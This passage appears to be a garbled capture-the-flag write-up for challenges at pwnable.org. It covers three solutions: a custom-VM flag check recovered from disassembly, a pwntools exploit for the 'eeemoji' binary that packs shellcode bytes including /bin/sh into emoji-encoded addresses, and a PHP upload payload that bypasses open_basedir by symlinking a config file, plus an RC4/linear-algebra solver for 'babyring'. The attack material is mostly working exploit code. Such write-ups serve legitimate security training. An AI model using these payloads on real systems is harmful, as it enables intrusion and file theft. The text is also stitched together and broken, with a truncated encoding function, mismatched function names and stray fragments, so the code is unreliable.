          break;
        case 0xC:
          pop_magic();
          break;
        case 0xD:
          *(_DWORD *)v9 = 1;
          break;
      }
    }
  }
  __asm { mtc0    $zero, Count # Timer Count }
}
0000  GETIMM 91d
0004  GETIMM 0
0008  GETINPUTLEN
000a  SETEQ
000c  J.TRUE 24
0010  GETIMM 1
0014  GETINPUTLEN
0016  SUB
0018  SETINPUTLEN
001a  GETINPUT
001c  GETIMM 1
0020  J.TRUE 4
0024  GETIMM 11
0028  MUL
002a  GETIMM b248
002e  MOD
0030  GETIMM 72a9
0034  SETEQ
0036  J.FALSE 18
flag[0]*0x11%0xb248 == 0x72a9
003a  GETIMM 11
003e  MUL
0040  GETIMM b248
0044  MOD
0046  GETIMM 97e
004a  SETEQ
004c  J.FALSE 2e
0050  GETIMM 11
0054  MUL
0056  GETIMM b248
005a  MOD
005c  GETIMM 5560
0060  SETEQ
0062  J.FALSE 44
0066  GETIMM 11
006a  MUL
006c  GETIMM b248
0070  MOD
0072  GETIMM 4ca1
0076  SETEQ
0078  J.FALSE 5a
007c  GETIMM 11
0080  MUL
0082  GETIMM b248
0086  MOD
0088  GETIMM 37
008c  SETEQ
008e  J.FALSE 70
0092  GETIMM 11
0096  MUL
0098  GETIMM b248
009c  MOD
009e  GETIMM aa71
00a2  SETEQ
00a4  J.FALSE 86
00a8  GETIMM 11
00ac  MUL
00ae  GETIMM b248
00b2  MOD
00b4  GETIMM 122c
00b8  SETEQ
00ba  J.FALSE 9c
00be  GETIMM 11
00c2  MUL
00c4  GETIMM b248
00c8  MOD
00ca  GETIMM 4536
00ce  SETEQ
00d0  J.FALSE b2
00d4  GETIMM 11
00d8  MUL
00da  GETIMM b248
00de  MOD
00e0  GETIMM 11e8
00e4  SETEQ
00e6  J.FALSE c8
00ea  GETIMM 11
00ee  MUL
00f0  GETIMM b248
00f4  MOD
00f6  GETIMM 1247
00fa  SETEQ
00fc  J.FALSE de
0100  GETIMM 11
0104  MUL
0106  GETIMM b248
010a  MOD
010c  GETIMM 76c7
0110  SETEQ
0112  J.FALSE f4
0116  GETIMM 11
011a  MUL
011c  GETIMM b248
0120  MOD
0122  GETIMM 96d
0126  SETEQ
0128  J.FALSE 10a
012c  GETIMM 11
0130  MUL
0132  GETIMM b248
0136  MOD
0138  GETIMM 122c
013c  SETEQ
013e  J.FALSE 120
0142  GETIMM 11
0146  MUL
0148  GETIMM b248
014c  MOD
014e  GETIMM 87cb
0152  SETEQ
0154  J.FALSE 136
0158  GETIMM 11
015c  MUL
015e  GETIMM b248
Misc
eeemoji
0162  MOD
0164  GETIMM 9e4
0168  SETEQ
016a  J.FALSE 14c
016e  GETIMM 91d
0172  J.FALSE 154
0174  GETINPUT
0176  GETIMM 0
017a  SETINPUTLEN
017c  STOP
from pwn import *
#p = process('./eeemoji',env={'LD_PRELOAD':'./libc-2.27.so'})
p = remote('pwnable.org', 31322)
def convaddr(a):
  f = ord(a[0])
  if f & 0b11111100 == 0b11111100:
    ans = ((ord(a[0])&0b1)30:
    b1 = int('10'+bits[-6:],2)
    b2 = int('10'+bits[-12:-6],2)
    b3 = int('10'+bits[-18:-12],2)
    b4 = int('10'+bits[-24:-18],2)
    b5 = int('10'+bits[-30:-24],2)
    b6 = int('1111110'+bits[:-30].rjust(1,'0'),2)
    conved =  chr(b6) + chr(b5) + chr(b4) + chr(b3) + chr(b2) +chr(b1)
    return conved
BEER = '\xf0\x9f\x8d\xba'
BULL = '\xf0\x9f\x90\xae'
HORSE = '\xf0\x9f\x90\xb4'
p.sendline(BEER)
raw_input()
#p.sendline(BULL)
print p.recv()
p.sendline(HORSE)
off = addrconv(0x41414141)
a1 = addrconv(0x49006a90)
a2 = addrconv(0x69622fb8)
a3= addrconv(0x68732f6e)
a4 = addrconv(0x48504100)
a5 = addrconv(0x03bc0c7)
a6 = addrconv(0x48900000)
a7 = addrconv(0x4890e789)
a8 = addrconv(0x3148f631) 
Cloud Computing
bypass openbasedir
ﬂagbinwalkﬂag
Cloud Computing v2
http://pwnable.org:47781/?action=upload&data[0]=
scanphpconﬁg.jsonphp
scanconﬁg.json
shellreadﬂag
Crypto
babyring
1=error_reporting(-1);symlink("/var/www/html/sandbox/690e89846bf794be4ed29f1ee
ca5e7f7f5b6ae92/config.json","/var/www/html/sandbox/690e89846bf794be4ed29f1eec
a5e7f7f5b6ae92/baba.php");echo file_get_contents("");
#!/usr/bin/env sage
from Crypto.Cipher import ARC4
import IPython, hashlib, struct, os, itertools, string, ast  
os.environ["TERM"] = 'screen'
(e, Ns) = ast.literal_eval(open("./pub.txt", 'rb').read())
K = 64
F = GF(2)
M = Matrix(F, 0, K)
def to_vector(v):
  return vector([((v % (2^K)) >> i) & 1 for i in xrange(K)])
xs, ys = [], []
while M.nrows() != K:
  idx = M.nrows()
  x = randint(1, 10^60)
  y = ZZ(pow(x, e, Ns[idx]))
  vec = to_vector(y)
  Mr = M.stack(vec)
  if Mr.rank() != idx + 1:
    continue
  M = Mr
  xs.append(x)
  ys.append(y)
  print 'Collecting: %d / %d' % (M.rank(), K)
M = M.transpose()
msg = 'Hello'
key = hashlib.sha256(msg).digest()[:16]
E = ARC4.new(key)
ksum = 0
for i in xrange(K):
  (ks, ) = struct.unpack("Q", E.encrypt(8 * '\x00'))
  ksum = ks ^^ ksum 
kv = to_vector(ksum)
sol = M.solve_right(kv)
kverify = 0
for i in xrange(K):
  if sol[i] != 0: kverify = kverify ^^ (ys[i] % (2^K))
assert kverify == ksum
from pwn import *
context.log_level = 'DEBUG'
p = remote("pwnable.org", 10001)
p.recvuntil("+")
suffix = p.recvuntil(")", drop=True)
p.recvuntil(" == ")
h = p.recvline().strip()
for comb in itertools.product(string.ascii_letters+string.digits, repeat=4):
  s = ''.join(comb) + suffix
  if hashlib.sha256(s).hexdigest() == h:
    p.sendline(''.join(comb))
    break
else:
  raise Exception("PoW failed...")
p.sendlineafter("message: ", msg)
for i in xrange(K):
  if sol[i] == 0:
    p.sendlineafter(": ", "0")
  else:
    p.sendlineafter(": ", str(xs[i]))
p.sendlineafter(": ", str(1234))
p.interactive()